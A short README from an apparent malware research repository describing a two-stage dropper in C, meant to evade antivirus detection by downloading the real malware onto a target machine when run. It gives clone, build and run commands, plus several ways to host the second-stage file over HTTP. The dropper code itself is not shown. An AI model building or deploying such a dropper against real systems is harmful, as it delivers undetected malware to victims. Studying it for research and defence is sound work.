# Overview
This is a two-stage dropper malware snippet create with C.  
The purpose of this malware is to avoid virus detection methods  
by downloading the target malware to a target machine when the  
executable runs.

## Build & Run
```bash
git clone https://github.com/0xvpr/Malicious-Software-Research.git msr
cd msr/06.living-off-the-land/01.simple-dropper
make # requires mingw
./dropper.exe # host must be running
```

## Testing
#### Host Dummy Server
In the the same directory, run any of the following commands on a (different machine).
Using python3:
```bash
PORT=8001
python3 -m http.server ${PORT}
```
Using ruby:
```bash
ruby -run -ehttpd . -p${PORT}
```
Using node:
```bash
PORT=8001
npm install -g http-server
http-server -p ${PORT}
```
Using php:
```bash
IP=$(ifconfig | awk '{print $2}' | grep "192") # wlan
PORT=8001
php -S ${IP}:${PORT}
```
